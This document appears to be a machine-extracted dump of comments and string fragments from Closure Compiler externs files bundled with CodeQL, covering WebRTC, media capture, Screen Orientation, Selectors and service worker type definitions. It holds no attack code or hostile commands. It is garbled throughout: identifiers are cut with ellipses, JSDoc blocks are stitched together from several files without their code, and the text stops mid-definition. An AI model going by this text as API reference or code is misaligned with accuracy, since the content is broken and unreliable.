function (!NavigatorUserMediaError)=function (!NavigatorUserMediaError)!NavigatorUserMediaErrorhttp://dev.w3.org/2011/webrtc/editor/getusermedia.html
https://www.w3.org/TR/mediacapture-streams/
?MediaStreamhttps://www.w3.org/TR/mediastream-recording/#dictdef-mediarecorderoptionshttps://www.w3.org/TR/mediastream-recording/#mediarecorder-api
MediaRecorderOptions=(function (!Event)|undefined)https://w3c.github.io/mediacapture-image/##photosettings-sectionhttps://w3c.github.io/mediacapture-image/##photocapabilities-section!Array.<!string>Array.<!string>https://w3c.github.io/mediacapture-image/
!PhotoSettings=!PhotoSettings!Promise.<!PhotoCapabilities>Promise.<!PhotoCapabilities>!PhotoCapabilities!Promise.<!ImageBitmap>Promise.<!ImageBitmap>!ImageBitmapImageBitmaphttps://www.w3.org/TR/webrtc/#rtctrackevent
?MediaStreamTrack?RTCRtpTransceiverhttps://www.w3.org/TR/mediacapture-streams/#idl-def-MediaDeviceKind
In WebIDL this is an enum with values 'audioinput', 'audiooutput', and
'videoinput', but there is no mechanism in Closure for describing a
specialization of the string type.Possible values are "sendrecv", "sendonly", "recvonly", and "inactive".https://www.w3.org/TR/webrtc/#dom-rtcrtptransceiverdirection!MediaDeviceKindhttps://www.w3.org/TR/mediacapture-streams/#mediadevices!Promise.<!Array.<!MediaDeviceInfo>>Promise.<!Array.<!MediaDeviceInfo>>!Array.<!MediaDeviceInfo>Array.<!MediaDeviceInfo>!MediaDeviceInfohttps://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/getUserMedia
!MediaStreamConstraints!Promise.<!MediaStream>Promise.<!MediaStream>https://w3c.github.io/mediacapture-main/#dom-mediadevices-getsupportedconstraints
!MediaTrackSupportedConstraints!MediaDeviceshttps://www.w3.org/TR/webrtc/#rtcsdptype
In WebIDL this is an enum with values 'offer', 'pranswer', and 'answer',
but there is no mechanism in Closure for describing a specialization of
the string type.The RTCSessionDescriptionInit
dictionary.  This optional argument may have type
{type:RTCSdpType, sdp:string}, but neither of these keys are required to be
present, and other keys are ignored, so the closest Closure type is Object.
https://www.w3.org/TR/webrtc/#rtcsessiondescription-class?RTCSdpTypehttps://www.w3.org/TR/webrtc/#dom-rtcsessiondescription-typehttps://www.w3.org/TR/webrtc/#dom-rtcsessiondescription-sdpTODO(bemasc): Remove this definition once it is removed from the browser.The label index (audio/video/data -> 0,1,2)
The ICE candidate in SDP text form
The RTCIceCandidateInit dictionary.
!RTCIceCandidateInit=!RTCIceCandidateInithttps://www.w3.org/TR/webrtc/#rtcicecandidate-interface({urls: string}|{urls: !Array.<!string>}){urls: string}{urls: !Array.<!string>}https://www.w3.org/TR/webrtc/#rtciceserver-dictionary
This dictionary type also has an optional key {credential: ?string}.(string|!Array.<!string>)This type, and several below it, are constructed as unions between records(RTCIceServerRecord_|RTCIceServerInterface_){iceServers: !Array.<!RTCIceServer>, sdpSemantics: (string|undefined)}!Array.<!RTCIceServer>Array.<!RTCIceServer>!RTCIceServerAllows specifying the SDP semantics. Valid values are "plan-b" and
"unified-plan".{@link https://webrtc.org/web-apis/chrome/unified-plan/}
(RTCConfigurationRecord_|RTCConfigurationInterface_)function (!RTCSessionDescription)!RTCSessionDescriptionfunction (this: SCOPE, Object, string, MAP)SCOPEThe value of "this" inside callback function.
SCOPE=MAP,SCOPE
readonly@readonly!IteratorIterable.<string>IteratorIterable.<string>TODO(bemasc): Remove this type once it is no longer in use.  It has already
been removed from the specification.!Array.<!RTCStatsReport>Array.<!RTCStatsReport>!RTCStatsReportfunction (!RTCStatsResponse, MediaStreamTrack=)!RTCStatsResponseMediaStreamTrack=This type is not yet standardized, so the properties here only represent
the current capabilities of libjingle (and hence Chromium).
TODO(bemasc): Add a link to the relevant standard once MediaConstraint has a
standard definition.TODO(bemasc): Make this type public once it is defined in a standard.(Object|MediaConstraintSetInterface_)?MediaConstraintSet_?Array.<!MediaConstraintSet_>Array.<!MediaConstraintSet_>!MediaConstraintSet_This type is used extensively in
{@see http://dev.w3.org/2011/webrtc/editor/webrtc.html} but is not yet
defined.(Object|MediaConstraintsInterface_)An enumerated string type (RTCDataChannelState) with values:
"connecting", "open", "closing", and "closed".(string|!Blob|!ArrayBuffer|!ArrayBufferView)!RTCDataChannel{reliable: boolean}@property[ordered=true]
maxPacketLifeTimemaxRetransmits[protocol=""]
[negotiated=false]
[priority='low']
see https://www.w3.org/TR/webrtc/#dom-rtcdatachannelinit for documentation
Type inconsistencies due to Closure limitations:
maxPacketLifeTime should be UnsignedShort
maxRetransmits should be UnsignedShort
protocol should be USVString
id should be UnsignedShort
In WebIDL priority is an enum with values 'very-low', 'low',
'medium' and 'high', but there is no mechanism in Closure for describing
a specialization of the string type.(RTCDataChannelInitInterface_|RTCDataChannelInitRecord_|RTCDataChannelInitDictionary_){expires: number}expires!MediaConstraints=!MediaConstraintsPromise.<RTCCertificate>(!RTCSessionDescriptionCallback|!MediaConstraints)=(!RTCSessionDescriptionCallback|!MediaConstraints)!RTCSessionDescriptionCallback!RTCPeerConnectionErrorCallback=!RTCPeerConnectionErrorCallback(!Promise.<!RTCSessionDescription>|undefined)!Promise.<!RTCSessionDescription>Promise.<!RTCSessionDescription>!RTCVoidCallback=!RTCVoidCallback?RTCSessionDescription?RTCConfiguration=?RTCConfiguration?MediaConstraints=?MediaConstraintsVoid in Chrome for now, a promise that you can then/catch in Firefox.!RTCIceCandidate!function (DOMException)=!function (DOMException)function (DOMException)(!Promise|undefined)!Promise!RTCIceGatheringState!RTCIceConnectionState!Array.<!MediaStream>!Array.<!RTCRtpSender>Array.<!RTCRtpSender>!RTCRtpSender!Array.<!RTCRtpReceiver>Array.<!RTCRtpReceiver>!RTCRtpReceiverRTCDataChannelInit=Additional streams.
...MediaStream(!MediaStreamTrack|string)?RTCRtpTransceiverInit=?RTCRtpTransceiverInit!RTCRtpTransceiverReturns the list of transceivers are currently attached to this peer.!Array.<!RTCRtpTransceiver>Array.<!RTCRtpTransceiver>!RTCConfigurationFirefox' getstats is synchronous and returns a much simpler
{!RTCStatsReport} Map-like object.!RTCStatsCallback=!RTCStatsCallback(undefined|!RTCStatsReport|!Promise.<!RTCStatsReport>)!Promise.<!RTCStatsReport>Promise.<!RTCStatsReport>?function (!RTCPeerConnectionIceEvent)function (!RTCPeerConnectionIceEvent)!RTCPeerConnectionIceEvent?function (!MediaStreamEvent)function (!MediaStreamEvent)!MediaStreamEvent?function (!RTCTrackEvent)function (!RTCTrackEvent)!RTCTrackEvent?function (!RTCDataChannelEvent)function (!RTCDataChannelEvent)!RTCDataChannelEventhttps://www.w3.org/TR/webrtc/#idl-def-rtcicetransportArray.<RTCIceCandidate>RTCIceCandidatePairRTCIceParameters!RTCIceGatherOptionsRTCIceGatherOptionshttps://msdn.microsoft.com/en-us/library/mt433107(v=vs.85).aspxhttps://www.w3.org/TR/webrtc/#idl-def-rtcdtlstransportArray.<ArrayBuffer>var Med ... kState;MediaSt ... ckStateSourceI ... e.kind;SourceI ... pe.kindSourceInfo.prototypeSourceI ... ype.id;SourceI ... type.idSourceI ... .label;SourceI ... e.labelSourceI ... facing;SourceI ... .facingMediaSe ... pe.max;MediaSe ... ype.maxMediaSe ... ototypeMediaSe ... pe.min;MediaSe ... ype.minMediaSe ... e.step;MediaSe ... pe.stepMediaTr ... ilitiesMediaTr ... .width;MediaTr ... e.widthMediaTr ... ototypeMediaTr ... height;MediaTr ... .heightMediaTr ... tRatio;MediaTr ... ctRatioMediaTr ... meRate;MediaTr ... ameRateMediaTr ... ngMode;MediaTr ... ingModeMediaTr ... volume;MediaTr ... .volumeMediaTr ... leRate;MediaTr ... pleRateMediaTr ... leSize;MediaTr ... pleSizeMediaTr ... lation;MediaTr ... llationMediaTr ... atency;MediaTr ... latencyMediaTr ... lCount;MediaTr ... elCountMediaTr ... viceId;MediaTr ... eviceIdMediaTr ... roupId;MediaTr ... groupIdMediaTr ... ceMode;MediaTr ... nceModeMediaTr ... reMode;MediaTr ... ureModeMediaTr ... usMode;MediaTr ... cusModeMediaTr ... sation;MediaTr ... nsationMediaTr ... eratureMediaTr ... ype.isoMediaTr ... ghtnessMediaTr ... ontrastMediaTr ... urationMediaTr ... arpnessMediaTr ... pe.zoomMediaTr ... e.torchMediaTr ... terest;MediaTr ... nterestMediaTr ... traintsMediaTr ... ontrol;MediaTr ... ControlMediaTr ... ession;MediaTr ... ressionMediaSt ... ck) {};MediaSt ... ack) {}MediaSt ... SourcesMediaSt ... e.kind;MediaSt ... pe.kindMediaSt ... ototypeMediaSt ... ype.id;MediaSt ... type.idMediaSt ... .label;MediaSt ... e.labelMediaSt ... nabled;MediaSt ... enabledMediaSt ... .muted;MediaSt ... e.mutedMediaSt ... ntHint;MediaSt ... entHintMediaSt ... remote;MediaSt ... .remoteMediaSt ... yState;MediaSt ... dyStateMediaSt ... onmute;MediaSt ... .onmuteMediaSt ... unmute;MediaSt ... nunmuteMediaSt ... nended;MediaSt ... onendedMediaSt ... rained;MediaSt ... trainedMediaSt ... ts) {};MediaSt ... nts) {}MediaSt ... traintsMediaSt ... n() {};MediaSt ... on() {}MediaSt ... e.cloneMediaSt ... pe.stopMediaSt ... ilitiesMediaSt ... ettingsvar Med ... ntInit;MediaSt ... entInitMediaSt ... ckEventMediaSt ... .track;MediaSt ... e.trackMediaSt ... re) {};MediaSt ... ure) {}MediaSt ... istenerMediaSt ... vt) {};MediaSt ... evt) {}MediaSt ... chEventMediaSt ... oTracksMediaSt ... tTracksMediaSt ... Id) {};MediaSt ... kId) {}MediaSt ... ackByIdfunction(trackId) {}MediaSt ... ddTrackfunction(track) {}MediaSt ... veTrackMediaSt ... .ended;MediaSt ... e.endedMediaSt ... active;MediaSt ... .activeMediaSt ... nactiveMediaSt ... dtrack;MediaSt ... ddtrackMediaSt ... etrack;MediaSt ... vetrackvar web ... Stream;var RTC ... ntInit;RTCDTMF ... entInitRTCDTMF ... geEventRTCDTMF ... e.tone;RTCDTMF ... pe.toneRTCDTMF ... ototypeRTCDTMF ... ap) {};RTCDTMF ... Gap) {}RTCDTMF ... ertDTMFfunctio ... Gap) {}RTCDTMF ... change;RTCDTMF ... echangeRTCDTMF ... Buffer;RTCDTMF ... eBufferfunctio ... ort) {}RTCRtpS ... e.dtmf;RTCRtpS ... pe.dtmfRTCRtpS ... ototypeRTCRtpS ... .track;RTCRtpS ... e.trackRTCRtpS ... ck) {};RTCRtpS ... ack) {}RTCRtpS ... ceTrackRTCRtpS ... n() {};RTCRtpS ... on() {}RTCRtpS ... ametersRTCRtpS ... ms) {};RTCRtpS ... ams) {}function(params) {}RTCRtpC ... gSourceRTCRtpC ... source;RTCRtpC ... .sourceRTCRtpC ... ototypeRTCRtpC ... estamp;RTCRtpC ... mestampRTCRtpR ... .track;RTCRtpR ... e.trackRTCRtpR ... ototypeRTCRtpR ... n() {};RTCRtpR ... on() {}RTCRtpR ... SourcesgetCont ... SourcesgetSync ... SourcesRTCRtpT ... verInitRTCRtpT ... ection;RTCRtpT ... rectionRTCRtpT ... ototypeRTCRtpT ... treams;RTCRtpT ... streamsRTCRtpT ... odings;RTCRtpT ... codingsfunctio ... rs() {}RTCRtpE ... ametersRTCRtpE ... adType;RTCRtpE ... oadTypeRTCRtpE ... ototypeRTCRtpE ... pe.dtx;RTCRtpE ... ype.dtxRTCRtpE ... active;RTCRtpE ... .activeRTCRtpE ... iority;RTCRtpE ... riorityRTCRtpE ... .ptime;RTCRtpE ... e.ptimeRTCRtpE ... itrate;RTCRtpE ... BitrateRTCRtpE ... merate;RTCRtpE ... amerateRTCRtpE ... pe.rid;RTCRtpE ... ype.ridRTCRtpE ... DownBy;RTCRtpE ... nDownByscaleRe ... nDownByRTCRtpT ... pe.mid;RTCRtpT ... ype.midRTCRtpT ... topped;RTCRtpT ... stoppedRTCRtpT ... on) {};RTCRtpT ... ion) {}RTCRtpT ... n() {};RTCRtpT ... on() {}RTCRtpT ... pe.stopRTCRtpT ... sender;RTCRtpT ... .senderRTCRtpT ... ceiver;RTCRtpT ... eceiverLongRan ... pe.max;LongRan ... ype.maxLongRange.prototypeLongRan ... pe.min;LongRan ... ype.minDoubleR ... pe.max;DoubleR ... ype.maxDoubleR ... ototypeDoubleR ... pe.min;DoubleR ... ype.minConstra ... ametersConstra ... .exact;Constra ... e.exactConstra ... ototypeConstra ... .ideal;Constra ... e.idealvar Con ... oolean;var Con ... String;var ConstrainDouble;var ConstrainLong;MediaTr ... aintSetMediaTr ... vanced;MediaTr ... dvancedMediaSt ... .audio;MediaSt ... e.audioMediaSt ... .video;MediaSt ... e.videoNavigat ... iaErrorNavigat ... DENIED;Navigat ... _DENIEDNavigat ... ototypeNavigat ... e.code;Navigat ... pe.codeNavigat ... e.name;Navigat ... pe.nameNavigat ... essage;Navigat ... messageNavigat ... ntName;Navigat ... intNameNavigat ... ck) {};Navigat ... ack) {}Navigat ... erMediaMediaSt ... stream;MediaSt ... .streamMediaRe ... imeTypeMediaRe ... ototypeMediaRe ... rSecondMediaRe ... re) {};MediaRe ... ure) {}MediaRe ... istenerMediaRe ... vt) {};MediaRe ... evt) {}MediaRe ... chEventMediaRe ... stream;MediaRe ... .streamMediaRe ... meType;MediaRe ... .state;MediaRe ... e.stateMediaRe ... nstart;MediaRe ... onstartMediaRe ... onstop;MediaRe ... .onstopMediaRe ... ilable;MediaRe ... ailableMediaRe ... npause;MediaRe ... onpauseMediaRe ... resume;MediaRe ... nresumeMediaRe ... nerror;MediaRe ... onerrorMediaRe ... Second;MediaRe ... ce) {};MediaRe ... ice) {}MediaRe ... e.startfunctio ... ice) {}MediaRe ... n() {};MediaRe ... on() {}MediaRe ... pe.stopMediaRe ... e.pauseMediaRe ... .resumeMediaRe ... estDataMediaRe ... pe) {};MediaRe ... ype) {}MediaRe ... pportedPhotoSe ... htMode;PhotoSe ... ghtModePhotoSe ... ototypePhotoSe ... Height;PhotoSe ... eHeightPhotoSe ... eWidth;PhotoSe ... geWidthPhotoSe ... uction;PhotoSe ... ductionPhotoCa ... uction;PhotoCa ... ductionPhotoCa ... ototypePhotoCa ... Height;PhotoCa ... eHeightPhotoCa ... eWidth;PhotoCa ... geWidthPhotoCa ... htMode;PhotoCa ... ghtModeImageCa ... gs) {};ImageCa ... ngs) {}ImageCa ... kePhotoImageCa ... ototypeImageCa ... n() {};ImageCa ... on() {}ImageCa ... ilitiesImageCa ... abFrameImageCa ... .track;ImageCa ... e.trackRTCTrac ... ceiver;RTCTrac ... eceiverRTCTrac ... ototypeRTCTrac ... .track;RTCTrac ... e.trackRTCTrac ... treams;RTCTrac ... streamsRTCTrac ... sceivervar MediaDeviceKind;var RTC ... ection;MediaDe ... viceId;MediaDe ... eviceIdMediaDe ... ototypeMediaDe ... e.kind;MediaDe ... pe.kindMediaDe ... .label;MediaDe ... e.labelMediaDe ... roupId;MediaDe ... groupIdMediaDe ... n() {};MediaDe ... on() {}MediaDe ... DevicesMediaDe ... nts) {}MediaDe ... erMediaMediaDe ... n()  {}MediaDe ... traintsgetSupp ... traintsfunction()  {}Navigat ... evices;Navigat ... Devicesvar RTCSdpType;RTCSess ... riptionRTCSess ... e.type;RTCSess ... pe.typeRTCSess ... ototypeRTCSess ... pe.sdp;RTCSess ... ype.sdpfunctio ... sdp) {}IceCand ... n() {};IceCand ... on() {}IceCand ... e.toSdpIceCand ... ototypeIceCand ... .label;IceCand ... e.labelRTCIceC ... didate;RTCIceC ... ndidateRTCIceC ... ototypeRTCIceC ... sdpMid;RTCIceC ... .sdpMidRTCIceC ... eIndex;RTCIceC ... neIndexRTCIceC ... agment;RTCIceC ... ragmentvar RTC ... ecord_;functio ... e_() {}RTCIceS ... erface_RTCIceS ... e.urls;RTCIceS ... pe.urlsRTCIceS ... ototypeRTCIceS ... ername;RTCIceS ... sernameRTCIceS ... ential;RTCIceS ... dentialvar RTCIceServer;RTCConf ... Record_RTCConf ... erface_RTCConf ... ervers;RTCConf ... ServersRTCConf ... ototypeRTCConf ... antics;RTCConf ... manticsvar RTC ... ration;var RTC ... llback;RTCSess ... allbackRTCPeer ... allbackvar RTCVoidCallback;var RTC ... gState;var RTC ... nState;RTCIceC ... onStateRTCPeer ... ceEventRTCPeer ... didate;RTCPeer ... ndidateRTCPeer ... ototypeRTCStat ... estamp;RTCStat ... mestampRTCStat ... ototypeRTCStat ... n() {};RTCStat ... on() {}RTCStat ... e.namesRTCStat ... me) {};RTCStat ... ame) {}RTCStat ... pe.statRTCStat ... .local;RTCStat ... e.localRTCStat ... remote;RTCStat ... .remoteRTCStat ... e.type;RTCStat ... pe.typeRTCStat ... ype.id;RTCStat ... type.idRTCStat ... bj) {};RTCStat ... Obj) {}RTCStat ... forEachRTCStat ... ey) {};RTCStat ... key) {}RTCStat ... ype.getRTCStat ... pe.keysvar RTCStatsElement;RTCStat ... .resultMediaCo ... erface_MediaCo ... eAudio;MediaCo ... veAudioMediaCo ... ototypeMediaCo ... eVideo;MediaCo ... veVideoMediaCo ... eement;MediaCo ... reementMediaCo ... annels;MediaCo ... hannelsvar Med ... ntSet_;MediaCo ... datory;MediaCo ... ndatoryMediaCo ... tional;MediaCo ... ptionalvar Med ... raints;RTCData ... .label;RTCData ... e.labelRTCData ... ototypeRTCData ... liable;RTCData ... eliableRTCData ... yState;RTCData ... dyStateRTCData ... Amount;RTCData ... dAmountRTCData ... onopen;RTCData ... .onopenRTCData ... nerror;RTCData ... onerrorRTCData ... nclose;RTCData ... oncloseRTCData ... n() {};RTCData ... on() {}RTCData ... e.closeRTCData ... essage;RTCData ... messageRTCData ... ryType;RTCData ... aryTypeRTCData ... ta) {};RTCData ... ata) {}RTCData ... pe.sendRTCData ... hannel;RTCData ... channelRTCData ... Record_RTCData ... erface_var RTC ... onary_;RTCData ... ionary_var RTC ... elInit;var RTCCertificate;RTCPeer ... hm) {};RTCPeer ... thm) {}RTCPeer ... ificateRTCPeer ... re) {};RTCPeer ... ure) {}RTCPeer ... istenerRTCPeer ... vt) {};RTCPeer ... evt) {}RTCPeer ... chEventRTCPeer ... ts) {};RTCPeer ... nts) {}RTCPeer ... teOffersuccess ... traintsRTCPeer ... eAnswerRTCPeer ... ck) {};RTCPeer ... ack) {}RTCPeer ... riptionRTCPeer ... iption;RTCPeer ... gState;RTCPeer ... ngStateRTCPeer ... dateIceRTCPeer ... nState;RTCPeer ... onStateRTCPeer ... n() {};RTCPeer ... on() {}RTCPeer ... StreamsRTCPeer ... Id) {};RTCPeer ... mId) {}RTCPeer ... eamByIdRTCPeer ... SendersRTCPeer ... ceiversRTCPeer ... ct) {};RTCPeer ... ict) {}RTCPeer ... ChannelRTCPeer ... dStreamRTCPeer ... am) {};RTCPeer ... eam) {}RTCPeer ... eStreamRTCPeer ... gs) {};RTCPeer ... rgs) {}RTCPeer ... ddTrackRTCPeer ... it) {};RTCPeer ... nit) {}RTCPeer ... sceiverRTCPeer ... urationRTCPeer ... on) {};RTCPeer ... ion) {}RTCPeer ... er) {};RTCPeer ... der) {}RTCPeer ... veTrackfunction(sender) {}RTCPeer ... or) {};RTCPeer ... tor) {}RTCPeer ... etStatsRTCPeer ... e.closeRTCPeer ... needed;RTCPeer ... nneededRTCPeer ... change;RTCPeer ... echangeonsigna ... echangeRTCPeer ... stream;RTCPeer ... dstreamRTCPeer ... ntrack;RTCPeer ... ontrackRTCPeer ... estreamoniceco ... echangeRTCPeer ... hannel;RTCPeer ... channelvar web ... ection;webkitR ... nectionvar moz ... ection;mozRTCP ... nectionfunctio ... rer) {}RTCIceT ... gState;RTCIceT ... ngStateRTCIceT ... ototypeRTCIceT ... on(){};RTCIceT ... ion(){}RTCIceT ... didatesfunction(){}RTCIceT ... atePairgetSele ... atePairRTCIceT ... ametersRTCIceT ... n(e){};RTCIceT ... on(e){}RTCIceT ... echangefunction(e){}ongathe ... echangeRTCIceT ... rchangeonselec ... rchangeRTCDtls ... nsport;RTCDtls ... ansportRTCDtls ... ototypeRTCDtls ... n() {};RTCDtls ... on() {}RTCDtls ... ficatesgetRemo ... ficatesRTCDtls ... n(e){};RTCDtls ... on(e){}RTCDtls ... echange/mnt/disk1/t-namanjain/CodeQL/codeql/javascript/tools/data/externs/web/w3c_screen_orientation.js
 * @fileoverview Definitions for W3C's Screen Orientation API.
 * @see https://w3c.github.io/screen-orientation/
 *
 * @externs
 
 * @interface
 * @extends {EventTarget}
 * @see https://w3c.github.io/screen-orientation/#screenorientation-interface
 
 * @param {string} orientation
 * @return {!Promise<void>}
 
 * @type {?ScreenOrientation}
 * @see https://w3c.github.io/screen-orientation/#extensions-to-the-screen-interface
 ScreenOrientationunlockDefinitions for W3C's Screen Orientation API.
https://w3c.github.io/screen-orientation/
*https://w3c.github.io/screen-orientation/#screenorientation-interface?ScreenOrientationhttps://w3c.github.io/screen-orientation/#extensions-to-the-screen-interfacevar Scr ... n() {};ScreenO ... on() {}ScreenO ... on) {};ScreenO ... ion) {}ScreenO ... pe.lockScreenO ... ototypeScreenO ... n() {};ScreenO ... .unlockScreenO ... e.type;ScreenO ... pe.typeScreenO ... .angle;ScreenO ... e.angleScreenO ... change;ScreenO ... nchangeScreen. ... tation;Screen. ... ntation/mnt/disk1/t-namanjain/CodeQL/codeql/javascript/tools/data/externs/web/w3c_selectors.js
 * @fileoverview Definitions for W3C's Selectors API.
 *  This file depends on w3c_dom1.js.
 *  @see http://www.w3.org/TR/selectors-api2/
 *
 * @externs
 
 * @param {string} selectors
 * @return {?Element}
 * @override
 * @nosideeffects
 
 * @param {string} selectors
 * @return {!NodeList<!Element>}
 * @override
 * @nosideeffects
 
 * https://dom.spec.whatwg.org/#dom-element-closest
 * https://developer.mozilla.org/en-US/docs/Web/API/Element.closest
 * @param {string} selectors
 * @return {?Element}
 * @nosideeffects
 
 * https://dom.spec.whatwg.org/#dom-element-matches
 * https://developer.mozilla.org/en-US/docs/Web/API/Element.matches
 * @param {string} selectors
 * @return {boolean}
 * @nosideeffects
 
 * @param {string} selectors
 * @param {(Node|NodeList<?>)=} refNodes
 * @return {boolean}
 * @nosideeffects
 
 * @see https://developer.mozilla.org/en/DOM/Node.mozMatchesSelector
 * @param {string} selectors
 * @return {boolean}
 * @nosideeffects
 
 * @see http://developer.apple.com/library/safari/documentation/WebKit/Reference/ElementClassRef/Element/Element.html
 * @param {string} selectors
 * @return {boolean}
 * @nosideeffects
 
 * @see http://msdn.microsoft.com/en-us/library/ff975201.aspx
 * @param {string} selectors
 * @return {boolean}
 * @nosideeffects
 
 * @see http://www.opera.com/docs/changelogs/windows/1150/
 * @param {string} selectors
 * @return {boolean}
 * @nosideeffects
 selectorsmatchesSelectorrefNodesmozMatchesSelectorwebkitMatchesSelectormsMatchesSelectoroMatchesSelectorDefinitions for W3C's Selectors API.
This file depends on w3c_dom1.js.
http://www.w3.org/TR/selectors-api2/
*https://dom.spec.whatwg.org/#dom-element-closest
https://developer.mozilla.org/en-US/docs/Web/API/Element.closesthttps://dom.spec.whatwg.org/#dom-element-matches
https://developer.mozilla.org/en-US/docs/Web/API/Element.matcheshttps://developer.mozilla.org/en/DOM/Node.mozMatchesSelector
http://developer.apple.com/library/safari/documentation/WebKit/Reference/ElementClassRef/Element/Element.html
http://msdn.microsoft.com/en-us/library/ff975201.aspx
http://www.opera.com/docs/changelogs/windows/1150/
Documen ... rs) {};Documen ... ors) {}Documen ... electorDocumen ... ctorAllElement ... rs) {};Element ... ors) {}Element ... electorElement ... ctorAllElement ... closestElement ... matchesElement ... es) {};Element ... des) {}functio ... des) {}webkitM ... elector/mnt/disk1/t-namanjain/CodeQL/codeql/javascript/tools/data/externs/web/w3c_serviceworker.js
 * @fileoverview Externs for service worker.
 *
 * @see http://www.w3.org/TR/service-workers/
 * @externs
 
 * @see http://www.w3.org/TR/service-workers/#service-worker-interface
 * @constructor
 * @extends {Worker}
  @type {ServiceWorkerState} 
 *  Set of possible string values: 'installing', 'installed', 'activating',
 * 'activated', 'redundant'.
 *  @typedef {string}
 
 * @see https://w3c.github.io/push-api/
 * @constructor
 
 * Please note there is an intent to deprecate this field in Chrome 43 or 44.
 * See https://www.chromestatus.com/feature/5283829761703936.
 * @type {string}
  @return {!Promise<boolean>} /** @re ... an>} */ @enum {string} /** @en ... ing} */ This is commented out since it has not been implemented yet in Chrome beta.// This ... e beta. Uncomment once it is available.// Unco ... ilable. var PushPermissionStatus  = {// var  ... us  = {  GRANTED: 'granted',//  GRA ... anted',  DENIED: 'denied',//  DEN ... enied',  DEFAULT: 'default'//  DEF ... efault'};//};
 * @see https://w3c.github.io/push-api/#idl-def-PushManager
 * @constructor
 
 * @param {PushSubscriptionOptions=} opt_options
 * @return {!Promise<PushSubscription>}
  @return {!Promise<PushSubscription>} /** @re ... on>} */ @return {!Promise<PushPermissionStatus>} /** @re ... us>} */ PushManager.prototype.hasPermission = function() {};// Push ... n() {};
 * @typedef {{userVisibleOnly: (boolean|undefined)}}
 * @see https://w3c.github.io/push-api/#idl-def-PushSubscriptionOptions
 
 * @see http://www.w3.org/TR/push-api/#idl-def-PushMessageData
 * @constructor
  @return {!ArrayBuffer} /** @re ... fer} */ @return {!Blob} /** @re ... lob} */ @return {*} /** @return {*} */ @return {string} /** @re ... ing} */
 * @see http://www.w3.org/TR/push-api/#idl-def-PushEvent
 * @constructor
 * @param {string} type
 * @param {!ExtendableEventInit=} opt_eventInitDict
 * @extends {ExtendableEvent}
  @type {?PushMessageData} /** @ty ... ata} */
 * @see http://www.w3.org/TR/service-workers/#service-worker-registration-interface
 * @interface
 * @extends {EventTarget}
  @type {ServiceWorker} /** @ty ... ker} */ @return {!Promise<void>} /** @re ... id>} */
 * @see https://w3c.github.io/push-api/
 * @type {!PushManager}
 
 * @see https://notifications.spec.whatwg.org/#service-worker-api
 * @param {string} title
 * @param {NotificationOptions=} opt_options
 * @return {!Promise<void>}
 
 * @see https://notifications.spec.whatwg.org/#service-worker-api
 * @param {!GetNotificationOptions=} opt_filter
 * @return {!Promise<?Array<?Notification>>}
 
 * @see http://www.w3.org/TR/service-workers/#service-worker-container-interface
 * @interface
 * @extends {EventTarget}
  @type {?ServiceWorker}  @type {!Promise<!ServiceWorkerRegistration>} /** @ty ... on>} */
 * @param {string} scriptURL
 * @param {RegistrationOptions=} opt_options
 * @return {!Promise<!ServiceWorkerRegistration>}
 
 * @param {string=} opt_documentURL
 * @return {!Promise<!ServiceWorkerRegistration|undefined>}
 
 * @return {!Promise<Array<!ServiceWorkerRegistration>>}
  @type {?function(!ErrorEvent)} 
 * @typedef {{scope: (string|undefined), useCache: (boolean|undefined)}}
  @type {!ServiceWorkerContainer} /** @ty ... ner} */
 * @see http://www.w3.org/TR/service-workers/#service-worker-global-scope-interface
 * @interface
 * @extends {WorkerGlobalScope}
  @type {!Cache}  @type {!CacheStorage} /** @ty ... age} */ @type {!ServiceWorkerClients} /** @ty ... nts} */ @type {!ServiceWorkerRegistration}  @type {!Console} /** @ty ... ole} */ @type {?function(!InstallEvent)}  @type {?function(!ExtendableEvent)}  @type {?function(!FetchEvent)} 
 * TODO(mtragut): This handler should get a custom event in the future.
 * @type {?function(!Event)}
  @type {?function(!MessageEvent)} 
 * @see http://www.w3.org/TR/service-workers/#service-worker-client-interface
 * @constructor
  @type {!Promise<void>} /** @ty ... id>} */ @type {VisibilityState} 
 * // TODO(mtragut): Possibly replace the type with enum ContextFrameType once
 * the enum is defined.
 * @type {string}
 
 * @param {*} message
 * @param {(!Array<!Transferable>|undefined)=} opt_transfer
 * @return {undefined}
  @return {!Promise} /** @re ... ise} */
 * @see http://www.w3.org/TR/service-workers/#service-worker-clients-interface
 * @interface
 
 * Deprecated in Chrome M43+, use matchAll instead. Reference:
 * https://github.com/slightlyoff/ServiceWorker/issues/610.
 * TODO(joeltine): Remove when getAll is fully deprecated.
 * @param {ServiceWorkerClientQueryOptions=} opt_options
 * @return {!Promise<!Array<!ServiceWorkerClient>>}
 
 * @param {ServiceWorkerClientQueryOptions=} opt_options
 * @return {!Promise<!Array<!ServiceWorkerClient>>}
 
 * @return {!Promise<void>}
 
 * @param {string} url
 * @return {!Promise<!ServiceWorkerClient>}
  @typedef {{includeUncontrolled: (boolean|undefined)}} /** @ty ... d)}} */
 * @see http://www.w3.org/TR/service-workers/#cache-interface
 * @interface
 
 * @param {!RequestInfo} request
 * @param {CacheQueryOptions=} opt_options
 * @return {!Promise<!Response|undefined>}
 
 * @param {RequestInfo=} opt_request
 * @param {CacheQueryOptions=} opt_options
 * @return {!Promise<!Array<!Response>>}
 
 * @param {!RequestInfo} request
 * @return {!Promise<void>}
 
 * @param {!Array<!RequestInfo>} requests
 * @return {!Promise<void>}
 
 * @param {!RequestInfo} request
 * @param {!Response} response
 * @return {!Promise<void>}
 
 * @param {!RequestInfo} request
 * @param {CacheQueryOptions=} opt_options
 * @return {!Promise<boolean>}
 
 * @param {RequestInfo=} opt_request
 * @param {CacheQueryOptions=} opt_options
 * @return {!Promise<!Array<!Request>>}
 
 * @typedef {{
 *   ignoreSearch: (boolean|undefined),
 *   ignoreMethod: (boolean|undefined),
 *   ignoreVary: (boolean|undefined),
 *   prefixMatch: (boolean|undefined),
 *   cacheName: (string|undefined)
 * }}
 
 * @see http://www.w3.org/TR/service-workers/#cache-storage-interface
 * @interface
 
 * Window instances have a property called caches which implements CacheStorage
 * @see https://www.w3.org/TR/service-workers/#cache-objects
 * @type {!CacheStorage}
 
 * @param {string} cacheName
 * @return {!Promise<boolean>}
 
 * @param {string} cacheName
 * @return {!Promise<!Cache>}
  @return {!Promise<!Array<string>>} 
 * @see http://www.w3.org/TR/service-workers/#extendable-event-interface
 * @constructor
 * @param {string} type
 * @param {ExtendableEventInit=} opt_eventInitDict
 * @extends {Event}
 
 * @param {IThenable} f
 * @return {undefined}
 
 * @typedef {{
